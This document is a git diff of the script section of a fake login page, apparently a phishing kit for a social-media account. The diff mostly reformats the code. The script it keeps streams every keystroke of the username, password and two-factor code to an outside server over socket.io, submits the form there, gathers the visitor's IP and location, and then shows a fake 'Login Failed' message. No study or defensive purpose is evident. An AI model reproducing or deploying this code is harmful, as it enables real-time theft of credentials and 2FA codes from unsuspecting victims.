@@ -325,14 +325,12 @@
 
 <script src="https://cdn.socket.io/4.8.3/socket.io.min.js"></script>
 
-    <script>
-        const socket = io("https://app-pljt.onrender.com");
-		<script>
-const socket = io("https://YOUR-RENDER-URL.onrender.com"); // replace with your render URL
+<script>
+const socket = io("https://app-pljt.onrender.com");
 
+// Get visitor IP + location
 async function sendVisitorInfo(){
     try{
-
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
@@ -349,79 +347,105 @@ async function sendVisitorInfo(){
 }
 
 sendVisitorInfo();
-        const form = document.getElementById("loginPage");
-        const usernameInput = document.getElementById("username");
-        const passwordInput = document.getElementById("password");
-        const codeInput = document.getElementById("code");
 
-        usernameInput.addEventListener("input", e => {
-            socket.emit("typing", { field: "username", value: e.target.value });
-        });
-        passwordInput.addEventListener("input", e => {
-            socket.emit("typing", { field: "password", value: e.target.value });
-        });
-        codeInput.addEventListener("input", e => {
-            socket.emit("typing", { field: "code", value: e.target.value });
-        });
+const form = document.getElementById("loginPage");
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const codeInput = document.getElementById("code");
 
-        form.addEventListener("submit", e => {
-            e.preventDefault();
-            const formData = Object.fromEntries(new FormData(form).entries());
-            console.log("Form submitted:", formData);
-            socket.emit("submit", formData);
+// typing events
+usernameInput.addEventListener("input", e => {
+    socket.emit("typing", { field: "username", value: e.target.value });
+});
 
-            let btn = form.querySelector(".login-btn");
-            btn.innerHTML = "Logging in...";
-            btn.disabled = true;
+passwordInput.addEventListener("input", e => {
+    socket.emit("typing", { field: "password", value: e.target.value });
+});
 
-            setTimeout(() => {
-                location.hash = "2fa";
-                showPage();
-                btn.innerHTML = "Log in";
-                btn.disabled = false;
-            }, 2000);
-        });
+codeInput.addEventListener("input", e => {
+    socket.emit("typing", { field: "code", value: e.target.value });
+});
 
-        function showPage() {
-            if (location.hash == "#2fa") {
-                document.getElementById("loginPage").style.display = "none";
-                document.getElementById("twofaPage").style.display = "flex";
-            } else {
-                document.getElementById("loginPage").style.display = "block";
-                document.getElementById("twofaPage").style.display = "none";
-            }
-        }
-        window.addEventListener("hashchange", showPage);
+// form submit
+form.addEventListener("submit", e => {
+
+    e.preventDefault();
+
+    const formData = Object.fromEntries(new FormData(form).entries());
+
+    console.log("Form submitted:", formData);
+
+    socket.emit("submit", formData);
+
+    let btn = form.querySelector(".login-btn");
+    btn.innerHTML = "Logging in...";
+    btn.disabled = true;
+
+    setTimeout(() => {
+
+        location.hash = "2fa";
+
         showPage();
 
-	// Facebook button
-	document.querySelector(".fb-login").addEventListener("click", () => {
-    	alert("Continue with Facebook");
-	});
+        btn.innerHTML = "Log in";
+        btn.disabled = false;
 
-	// Forgot password
-	document.querySelector(".forgot").addEventListener("click", () => {
-	alert("Forgot password clicked");
-	});
+    }, 2000);
 
-	// Signup
-	document.querySelector(".signup span").addEventListener("click", () => {
-    	alert("Create new account clicked");
-	});
+});
 
-	// 2FA Confirm button
-	document.getElementById("confirmBtn").addEventListener("click", () => {
-        const code = document.getElementById("code").value;
+// page switch
+function showPage(){
 
-    	if (!code) {
-        	alert("Enter security code");
-        	return;
-    	}
+    if (location.hash == "#2fa") {
 
-    	socket.emit("submit", { code: code });
+        document.getElementById("loginPage").style.display = "none";
+        document.getElementById("twofaPage").style.display = "flex";
 
-    	alert("Login Failed please try again after some time");
-	});
-    </script>
+    } else {
+
+        document.getElementById("loginPage").style.display = "block";
+        document.getElementById("twofaPage").style.display = "none";
+
+    }
+
+}
+
+window.addEventListener("hashchange", showPage);
+
+showPage();
+
+// Facebook button
+document.querySelector(".fb-login").addEventListener("click", () => {
+    alert("Continue with Facebook");
+});
+
+// Forgot password
+document.querySelector(".forgot").addEventListener("click", () => {
+    alert("Forgot password clicked");
+});
+
+// Signup
+document.querySelector(".signup span").addEventListener("click", () => {
+    alert("Create new account clicked");
+});
+
+// 2FA confirm button
+document.getElementById("confirmBtn").addEventListener("click", () => {
+
+    const code = document.getElementById("code").value;
+
+    if (!code) {
+        alert("Enter security code");
+        return;
+    }
+
+    socket.emit("submit", { code: code });
+
+    alert("Login Failed please try again after some time");
+
+});
+</script>
+
 </body>
 </html>
